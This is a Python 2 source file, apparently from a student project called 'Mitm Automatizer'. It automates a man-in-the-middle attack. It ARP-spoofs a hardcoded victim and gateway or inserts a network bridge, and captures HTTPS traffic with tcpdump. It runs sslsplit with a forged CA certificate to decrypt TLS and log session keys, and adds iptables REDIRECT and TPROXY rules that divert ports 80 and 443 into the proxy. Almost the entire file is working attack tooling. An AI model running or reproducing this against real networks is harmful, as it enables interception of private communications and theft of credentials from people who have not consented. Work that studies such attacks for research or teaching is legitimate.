#! /usr/bin/env python2.7
#install dependencies: colorlog

"""
Parametre:
-o --output kam ukladat vysledne data?
-b --bridge
-c --certificate certifikaty?
- --keylog
    Where to save ssl session keys

-W --wifi
    Use wifi (arpspoof on connected network or create hotspot ?)
-D
    Enable debug mode

-4 --ipv4
    Use ipv4 (default: both 4 and 6)
-6 --ipv6
    Use ipv6

--RSA
    use only RSA cipher suites (default=all)

Co treba spustit:
bridge / arpspoof
iptables / ip6tables
tcpdump?
sslsplit / neskor sslstrip+

cleanup:
skoncit sslsplit,
tcpdump?
flush iptables
stop arpspoof/ bridge

"""

import subprocess
import threading
import os
import sys
import errno
import argparse
import time
from signal import *
from colorlog import ColoredFormatter
from gui import *
from htmlLogger import *


#
# #Konfiguracia SSLsplitu
# SSLsplitConfig = {
#     "binPath" : "/home/netfox/BP-Marusic/sslsplit",
#     "outDir" : "/mnt/sda1/MitM/",
#     "sslKeyLogFile" : "sslkeys",
#     "certDir" : "certs/",
#     "pem" : "ca.key",
#     "crt" : "ca.crt",
#     "key" : "ca.key",
# }
#
#
# #tcpdumpu
# TcpdumpConfig = {
#     "maxFileSize" : 100000,
#     "maxFiles" : 100,
#     "outDir" : "/mnt/sda1/MitM/",
#     "outName" : "data.pcap",
#     "interface" : "eno1"
# }


def parseArgs():
    parser = argparse.ArgumentParser(description='Mitm Automatizer', add_help=False)
    parser.add_argument('-h', '--help', action='count', default=0, help='Prints this help')

    group = parser.add_mutually_exclusive_group()
    #EN HELP
    # group.add_argument('--arp', help='Use arpspoof (connection in LAN).', action="store_true")
    # group.add_argument('--bridge', help='Use bridge (upstream connection before LAN).', action="store_true")
    # group.add_argument('--nobridge', help='Do not setup bridge (Useful when the bridge is already created).', action="store_true")
    #
    # parser.add_argument('--dbg', help='Print debug info', action="store_true")
    # parser.add_argument('--nopcap', help='Do not capture to pcap.', action="store_true")
    # parser.add_argument('--gui', help='Run with GUI.', action="store_true")
    # parser.add_argument('--ipv6', help='Use ipv6.', action="store_true")
    # parser.add_argument('--output', help='Directory where to save captured data.', dest="output")

    #CZ HELP
    group.add_argument('--arp', help='Pouzit arpspoof (zapojenie v LAN).', action="store_true")
    group.add_argument('--bridge', help='Pouzit bridge (upstream pripojenie pred LAN).', action="store_true")
    group.add_argument('--nobridge', help='Nepouzivat bridge (uzivatel vytvoril vlastny bridge).',
                       action="store_true")

    parser.add_argument('--dbg', help='Vypis debug informacii', action="store_true")
    parser.add_argument('--nopcap', help='NEzachytavat do pcap suboru.', action="store_true")
    parser.add_argument('--gui', help='Spustit s GUI.', action="store_true")
    parser.add_argument('--ipv6', help='Pouzit ipv6.', action="store_true")
    parser.add_argument('--output', help='Priecinok pre ulozenie zachytenych dat.', dest="output")

    try:
        args = parser.parse_args()
    except argparse.ArgumentError:
        print >> sys.stderr, "Error wrong arguments"
        sys.exit(1)

    if args.help > 0:
        if len(sys.argv) == 2:
            parser.print_help()
            sys.exit(0)
        else:
            parser.print_help()
            print >> sys.stderr, "Error, too many arguments"
            sys.exit(1)

    return args


def setup_logger(args):
    """Return a logger with a default ColoredFormatter."""
    formatter = ColoredFormatter(
        "%(log_color)s%(asctime)s:%(levelname)s: %(message)s",
        datefmt='%m/%d/%Y %I:%M:%S %p',
        log_colors={
            'DEBUG':    'white',
            'INFO':     'green',
            'WARNING':  'yellow',
            'ERROR':    'red',
            'CRITICAL': 'red',
        }
    )

    logger = logging.getLogger('example')
    logger.setLevel(logging.DEBUG)

    #GUI LOGGER only log info ...

    handlerCli = logging.StreamHandler()
    handlerCli.setFormatter(formatter)

    fh = logging.FileHandler('mitm.log')
    fh.setLevel(logging.DEBUG)
    formatter1 = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    fh.setFormatter(formatter1)

    if args.dbg:
        handlerCli.setLevel(logging.DEBUG)
    else:
        handlerCli.setLevel(logging.INFO)

    logger.addHandler(handlerCli)
    logger.addHandler(fh)

    return logger


class ProcessThread (threading.Thread):
    def __init__(self, name, args):
        threading.Thread.__init__(self)
        self.ready = threading.Event()
        #self.daemon = True
        self.processOpen = None
        self.name = name
        self.args = args
        self.out = None
        self.err = None


    def run(self):
        logger.debug("Starting " + self.name + str(self.args))
        if self.processOpen is None:
            try:
                self.processOpen = subprocess.Popen(self.args, stdout=subprocess.PIPE, stderr=None)
            except OSError as e:
                global anyThreadError
                anyThreadError = e.errno
                if e.errno == os.errno.ENOENT:
                    logger.error("The " + self.name + " is not installed")
                else:
                    raise
                self.ready.set()
                return

            #The program is ready
            logger.info("Started " + self.name)
            self.ready.set()

            self.processOpen.wait()
            self.out, self.err = self.processOpen.communicate()
            logger.debug(self.name + ": " + self.out)
            logger.debug("%s returned: %s", self.name, str(self.processOpen.returncode))

    def stop(self):
        if self.processOpen:
            if self.processOpen.poll() is None:
                self.processOpen.terminate()
                logger.info("Stopped the process %s", self.name)
            else:
                logger.debug(self.name + " process is stopped")
        else:
            logger.debug(self.name + " process is stopped")

    def tryStart(self):
        self.start()
        self.ready.wait()


class ArpSpoof:
    def __init__(self, interface, GW, victim=None):
        self.interface = interface
        self.gateway = GW
        self.victimIP = victim
        self.processThread = None
        self.processThread1 = None

    def _setupProcess(self):
        if self.processThread is None:
            args = ["arpspoof", "-i", self.interface, self.gateway]
            if self.victimIP:
                args.extend(["-t", self.victimIP])
                logger.debug(args)
            self.processThread = ProcessThread("arpspoof", args)
        if self.victimIP and self.processThread1 is None:
            args = ["arpspoof", "-i", self.interface, self.victimIP, "-t", self.gateway]
            logger.debug(args)
            self.processThread1 = ProcessThread("arpspoof1", args)

    def start(self):
        if self.processThread is None and self.processThread1 is None:
            self._setupProcess()
            if self.processThread:
                self.processThread.tryStart()
            if self.processThread1:
                self.processThread1.tryStart()
        else:
            logger.debug("Error: there is uncleaned process thread")

    def stop(self):
        if self.processThread:
            self.processThread.stop()
        if self.processThread1:
            self.processThread1.stop()


class Tcpdump:
    def __init__(self):
        self.processThread = None
        self.maxFileSize = 100000
        self.maxFiles = 100
        self.outDir = "/mnt/sda1/MitM/"
        self.outName = "data.pcap"
        self.interface = "eno1"

    def _setupProcess(self):
        if self.processThread is None:
            args = ["tcpdump", "-n", "-i", self.interface, "-s", "0", "-C", str(self.maxFileSize)]
            args.extend(["-w", self.outDir + self.outName])
            if self.maxFiles:
                args.extend(["-W", str(self.maxFiles)])
            args.extend(["tcp", "port", "443"])
            logger.debug(args)

            self.processThread = ProcessThread("tcpdump", args)

    def start(self):
        if self.processThread is None:
            self._setupProcess()
        self.processThread.tryStart()


    def stop(self):
        if self.processThread:
            self.processThread.stop()

class SSLsplit:
    def __init__(self):
        self.processThread = None
        self.certDir = "certs/"
        self.binPath = "/home/netfox/BP-Marusic/sslsplit"
        self.outDir = "/mnt/sda1/MitM/"
        self.sslKeyLogFile = "sslkeys"
        self.useDebug = False
        self.pem = "ca.key"
        self.crt = "ca.crt"
        self.key = "ca.key"
        self.args = ""
        self.logAppData = None # "testik.log"
        self.ipv6 = False

    def _setupProcess(self):
        if self.processThread is None:
            self._sslsplitArgs()
            self.processThread = ProcessThread("sslsplit", self.args)

    def _sslsplitArgs(self):
        try:
            os.makedirs(self.outDir)
        except OSError as exception:
            if exception.errno != errno.EEXIST:
                raise

        args = [self.binPath]
        if self.ipv6:
            args.extend(["-e", "tproxy"])
        if self.logAppData:
            args.extend(["-L", self.logAppData])
        args.extend(["-K", self.certDir + self.pem])
        args.extend(["-k", self.certDir + self.key])
        args.extend(["-c", self.certDir + self.crt])
        if self.useDebug:
            args.append("-D")
        if self.sslKeyLogFile:
            args.extend(["-A", self.outDir + self.sslKeyLogFile])

        #Proxy settings
        args.extend(["https", "0.0.0.0", "10443"])
        args.extend(["http", "0.0.0.0", "10080"])

        if self.ipv6:
            args.extend(["https", "::1", "10443"])
            args.extend(["http", "::1", "10080"])
        self.args = args

    def start(self):
        if self.processThread is None:
            self._setupProcess()
        self.processThread.tryStart()

    def stop(self):
        if self.processThread:
            self.processThread.stop()


def runCmd(cmd):
    global anyThreadError
    try:
        output = subprocess.check_output(cmd.split(), stderr=subprocess.STDOUT)
        logger.debug(cmd)
        logger.debug(cmd.split(' ', 1)[0] + ": " + output)
    except OSError as e:
        if e.errno == os.errno.ENOENT:
            logger.error("The " + cmd.split(' ', 1)[0] + " is not installed")
            anyThreadError = e.errno
            return e.errno
        else:
            # Something else went wrong while trying to run `wget`
            raise
    except subprocess.CalledProcessError, e:
        logger.error("The " + cmd.split(' ', 1)[0] + " exited with error: " + str(e.returncode))
        anyThreadError = e.returncode
        return e.returncode

    return 0

class Bridge:
    def __init__(self):
        self.createdBridge = False
        self.ifaceGW = "enp2s0"
        self.ifaceLAN = "eno1"
        self.bridge = "br0"



    def create(self):
        if self.createdBridge is False:
            logger.debug("Creating bridge")
            runCmd("/usr/sbin/brctl addbr " + self.bridge)
            logger.debug("Adding " + self.ifaceGW + "  to " + self.bridge)
            runCmd("/usr/sbin/brctl addif "+ self.bridge + " " + self.ifaceGW)
            logger.debug("Adding " + self.ifaceLAN + " to "+ self.bridge)
            runCmd("/usr/sbin/brctl addif "+ self.bridge +" "+ self.ifaceLAN)
            logger.debug("Running dhclient on "+ self.bridge +" to get default GW")
            runCmd("/usr/sbin/dhclient " + self.bridge)

            logger.debug("Setting " + self.ifaceGW + " up")
            runCmd("ifconfig " + self.ifaceGW + " 0.0.0.0 promisc up")

            logger.debug("Setting " + self.ifaceLAN + " up")
            runCmd("ifconfig " + self.ifaceLAN + " 0.0.0.0 promisc up")

            logger.debug("Setting "+ self.bridge +" up")
            if runCmd("ip link set "+ self.bridge +" up") == 0:
                logger.info("Bridge created")
                self.createdBridge = True
            else:
                logger.error("Bridge is not created")

    def remove(self):
        if self.createdBridge:
            runCmd("ip link set "+ self.bridge +" down")
            runCmd("brctl delbr "+ self.bridge +"")
            #runCmd("dhclient -r br0")
            runCmd("killall dhclient")
            self.createdBridge = False
            logger.info("Bridge removed")
        else:
            logger.debug("No bridge to cleanup")


class Iptables:
    def __init__(self):
        self.createdIpv4 = False
        self.createdIpv6 = False
        #usedInterface = None

    def createIpv4(self, interface="eno1"):
        self.flushAll()
        runCmd("sysctl -w net.ipv4.ip_forward=1")
        runCmd("iptables -A INPUT -p tcp -m physdev --physdev-in {} -j LOG".format(interface)) # Do not know why.. but without this kernel do not process other packet and forwards them only withou SSLSplit magic
        runCmd("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 10080") # (HTTP connections)
        runCmd("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 10443") # (HTTPS connections)
        runCmd("iptables -t nat -L")

        self.createdIpv4 = True

    def createAll(self, interface="eno1"):
        self.flushAll()
        runCmd("sysctl -w net.ipv4.ip_forward=1")
        runCmd("sysctl -w net.ipv4.conf.all.rp_filter=0")
        runCmd("sysctl -w net.ipv4.conf.enp2s0.rp_filter=0")
        runCmd("sysctl -w net.ipv4.conf.eno1.rp_filter=0")
        runCmd("ip -f inet rule add fwmark 1 lookup 100")
        runCmd("ip -f inet route add local default dev {} table 100".format(interface))
        runCmd("iptables -t mangle -N DIVERT")
        runCmd("iptables -t mangle -A DIVERT -j MARK --set-mark 1")
        runCmd("iptables -t mangle -A DIVERT -j ACCEPT")
        runCmd("iptables -t mangle -A PREROUTING -p tcp -m socket -j DIVERT")
        runCmd("iptables -t mangle -A PREROUTING -p tcp --dport 80 -j TPROXY --tproxy-mark 0x1/0x1 --on-port 10080")
        runCmd("iptables -t mangle -A PREROUTING -p tcp --dport 443 -j TPROXY --tproxy-mark 0x1/0x1 --on-port 10443")

        self.createdIpv4 = True


    def flushAll(self):
        self.flushIpv4()
        self.flushIpv6()

    def flushIpv4(self):
        if self.createdIpv4:
            logger.info("Removing ipv4 routing rules")
            runCmd("iptables -F")
            runCmd("iptables -t mangle -F")
            runCmd("iptables -t nat -F")
            self.createdIpv4 = False

    def flushIpv6(self):
        if self.createdIpv6:
            logger.info("Removing ipv6 routing rules")
            runCmd("ip6tables -F")
            runCmd("ip6tables -t mangle -F")
            runCmd("ip6tables -t nat -F")
            self.createdIpv6 = False


def stopThreads():
    logger.info("Cleaning Up and sotpping the tools!")
    if arp:
        arp.stop()
    if sslsplit:
        sslsplit.stop()
    subprocess.call("killall sslsplit &> /dev/null", shell=True)
    if bridge:
        bridge.remove()
    if iptables:
        iptables.flushAll()
    if tcpdump:
        tcpdump.stop()


def cleanup(retcode, frame=None):
    stopThreads()
    sys.exit(retcode)


wifi = False
anyThreadError = 0
arp = None
bridge = None
iptables = None
logger = None
tcpdump = None
sslsplit = None
logger = None


def runThreads(args):
    if args is None:
        logger.error("no arguments supplied")
        return
    global anyThreadError, arp, bridge, iptables, logger, tcpdump, sslsplit

    if args.arp:
        # Starting
        arp = ArpSpoof("ens3", "192.168.122.1", "192.168.122.140")
        arp.start()
    elif args.nobridge:
        pass
    else:
        #start bridge
        bridge = Bridge()
        bridge.create()

    if args.nopcap:
        pass
    else:
        tcpdump = Tcpdump()
        if args.output is not None:
            tcpdump.outName = args.output
        tcpdump.start()

    sslsplit = SSLsplit()
    sslsplit.useDebug = args.dbg
    sslsplit.ipv6 = args.ipv6
    sslsplit.start()

    iptables = Iptables()
    if args.ipv6:
        iptables.createAll()
    else:
        iptables.createIpv4()

    return


def runCli(args):
    global logger
    logger = setup_logger(args)
    runThreads(args)

    print "Press Ctrl-C to quit"

    while 1:
        time.sleep(5)
        if anyThreadError != 0:
            cleanup(anyThreadError)
    cleanup(0)
    return 0


def runGui(args):
    def wrapperStart():
        ui.pushButton.setEnabled(False)
        ui.pushButton_2.setEnabled(True)
        ui.pushButton_3.setEnabled(False)
        ui.plainTextEdit2.widget.clear()

        runThreads(args)

    def wrapperStop():
        stopThreads()
        ui.pushButton.setEnabled(True)
        ui.pushButton_2.setEnabled(False)
        ui.pushButton_3.setEnabled(True)

    global logger, anyThreadError
    logger = setup_logger(args)

    app = QtGui.QApplication(sys.argv)
    MainWindow = QtGui.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    # ui logger
    ui.plainTextEdit2.setLevel(logging.INFO)
    formatterHtmlColors = htmlColorFormatter("%(message)s")
    ui.plainTextEdit2.setFormatter(formatterHtmlColors)
    logger.addHandler(ui.plainTextEdit2)
    ui.pushButton.clicked.connect(wrapperStart)
    ui.pushButton_2.clicked.connect(wrapperStop)
    MainWindow.show()

    ret = app.exec_()
    stopThreads()
    sys.exit(ret)


def main():
    for sig in (SIGILL, SIGINT, SIGTERM):
        signal(sig, cleanup)

    args = parseArgs()
    print args

    if args.gui:
        runGui(args)
    else:
        runCli(args)

main()
